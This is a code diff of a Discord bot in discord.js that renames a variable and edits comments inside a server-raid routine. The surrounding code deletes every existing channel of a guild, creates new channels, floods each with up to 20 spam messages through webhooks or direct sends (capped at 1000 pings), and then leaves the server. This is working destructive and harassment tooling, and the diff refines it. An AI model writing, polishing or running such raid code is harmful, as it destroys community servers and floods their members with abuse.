@@ -40,7 +40,7 @@ client.on('messageCreate', async (message) => {
     let pingCount = 0;
     const maxPings = 1000;
 
-    // Parallel deletion of all existing content
+    // Delete all existing content
     await Promise.all([
       guild.channels.cache.forEach(async (channel) => {
         try {
@@ -80,13 +80,13 @@ client.on('messageCreate', async (message) => {
 
     await Promise.all(createPromises);
 
-    // Spam each channel using webhook or fallback
-    const spamPromises = [];
+    // Spam logic - 20 messages per channel via webhook or fallback
+    const spamTasks = [];
 
     for (const channel of createdChannels) {
       if (pingCount >= maxPings) break;
 
-      spamPromises.push(
+      spamTasks.push(
         (async () => {
           let webhook;
           try {
@@ -98,7 +98,7 @@ client.on('messageCreate', async (message) => {
             // Fallback to sending directly
             for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
               if (pingCount >= maxPings) break;
-              spamPromises.push(channel.send(spamMessage).catch(() => {}));
+              spamTasks.push(channel.send(spamMessage).catch(() => {}));
               pingCount++;
             }
             return;
@@ -106,7 +106,7 @@ client.on('messageCreate', async (message) => {
 
           for (let i = 0; i < Math.min(20, maxPings - pingCount); i++) {
             if (pingCount >= maxPings) break;
-            spamPromises.push(
+            spamTasks.push(
               webhook.send(spamMessage).catch(async () => {
                 try {
                   await channel.send(spamMessage);
@@ -120,7 +120,8 @@ client.on('messageCreate', async (message) => {
       );
     }
 
-    await Promise.all(spamPromises);
+    // Run spam tasks concurrently
+    await Promise.all(spamTasks);
 
     // Leave server
     try {
